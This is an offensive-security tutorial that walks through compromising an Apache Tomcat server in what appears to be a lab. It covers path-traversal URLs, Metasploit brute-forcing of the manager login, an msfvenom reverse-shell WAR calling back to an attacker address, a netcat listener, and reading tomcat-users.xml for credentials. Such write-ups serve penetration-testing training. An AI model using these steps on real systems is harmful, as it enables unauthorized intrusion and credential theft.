TOMCAT HACKING 101

Apache Tomcat is a widely used open-source implementation of Java Servlet, JavaServer Pages (JSP), and other Java-based web technologies.

In this scenario, we are going to attack Tomcat step by step until we gain a root shell.

First, read the below text to understand how Apache Tomcat works and its structure.

How Tomcat works:

Servlet Container:

Tomcat provides a servlet container that implements the Java Servlet API and manages the lifecycle of servlets, including their loading, initialization, and execution.

Request Handling:

Tomcat listens for HTTP requests on specified ports. When a request is received, Tomcat maps it to a corresponding servlet based on the URL pattern and passes the request to it.

JSP Handling:

JSPs are compiled into servlets by Tomcat. When a JSP is requested, Tomcat translates the JSP into a Java servlet, compiles it, and then executes it to generate the response.

Lifecycle Management:

Tomcat handles the lifecycle of web applications, including deployment, start, stop, and reload operations.

Structure of Tomcat

Directories:

-bin: Contains startup and shutdown scripts ( startup.sh, shutdown.bat).

-conf: Contains configuration files (server.xml, web.xml).

-lib: Contains JAR files needed by Tomcat.

-logs: Stores log files generated by Tomcat.

-temp: Used by Tomcat for temporary files.

-web apps: Default directory for web application deployment.

-work: Stores compiled JSP files and session data.

Key Configuration Files:

-server.xml: Main configuration file for Tomcat server settings, including ports, hosts, and connectors.

-web.xml: Default deployment descriptor file for web applications, specifying servlet mappings and other settings.

-context.xml: Contains configuration for individual web applications.

Components:

-Catalina: The core servlet container implementation within Tomcat.

-Coyote: The HTTP connector component that listens for incoming requests.

-Jasper: The JSP engine responsible for compiling JSPs into servlets.

-Cluster: Provides support for clustering and session replication.

-Realm: Manages security and authentication.

Common Misconfiguration/Vulnerabilities

Password Exposure via Backtrace:

Accessing the /auth.jsp endpoint might reveal the password in a backtrace if certain conditions are met.

CVE-2007-1860 Vulnerability:

The mod_jk module has a flaw where double URL encoding can lead to path traversal.

For example, using the URL pathTomcat/%252E%252E/manager/html could get unauthorized access to the Tomcat management interface.

Tomcat Path Traversal Techniques:

Certain misconfigurations in Tomcat make it possible to reach protected directories by manipulating URLs with ..;/.

Examples include accessing www.vulnerable-site.com/directory/..;/manager/html or http://www.vulnerable-site.com/;param=value/manager/html.

Vulnerabilities in Apache Tomcat Example Scripts (versions 4.0 to 7.x):

These versions contain example scripts that are prone to information disclosure and cross-site scripting (XSS) vulnerabilities.

Some scripts might be vulnerable:

/examples/jsp/num/numguess.jsp

/examples/jsp/dates/date.jsp

/examples/jsp/snp/snoop.jsp

/examples/jsp/error/error.html

/examples/jsp/sessions/carts.html

Brute-Force Tomcat

We have a Metasploit module for this to brute-force passwords of this login page.

Steps to brute-force:

Open msfconsole:

msfconsole -q

Use the auxiliary scanner module tomcat_mgr_login:

use auxiliary/scanner/http/tomcat_mgr_login

Set the right options:

set RHOSTS 192.168.125.100

set BRUTEFORCE_SPEED 1

set USERNAME tomcat

Run the scanner:

run

We have put bruteforce_speed to 1 since we don't want any protection against brute force to be triggered. We also guess that the username is tomcat by default.

Awesome we successfully got the username and password right. Now let's try it on the browser where we have our web app opened.

You can either go manually by the /manager/html directory or you can click on the Manager App button on the right side.

Put the credentials: tomcat for username and admin for password.

http://192.168.125.100:8080/manager/html

Alright, now that we are logged in as manager we should know that the Tomcat manager GUI lets you upload any war file.

So the next step is uploading our malicious war file.

Getting root shell

Below image to show you where you should upload the malicious war file.

Let's create the war file with msfvenom.

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.125.200 LPORT=4444 -f war -o reverse.war

Upload it on the application by clicking on the browse button and then click the Deploy button.

If we scroll up to the application list deployed we can see our file is successfully deployed on the directory /reverse.

Before we visit that on the browser we need to open a Netcat listener.

nc -lvp 4444

We trigger now the war file by clicking on the reverse or we go manually:

http://192.168.125.100:8080/reverse/

id
whoami

After we successfully get the shell, we can verify that we are root by using whoami or id command.

Another thing we can do is find the user's file.

find / -name tomcat-users.xml 2>/dev/null

And then using the cat command see the results of the file:

cat /usr/local/tomcat/conf/tomcat-users.xml

We notice that the file has only 1 user the one we earlier brute-forced.

In other cases, there might be other users, with whom you can log in using the credentials found in the user's file.
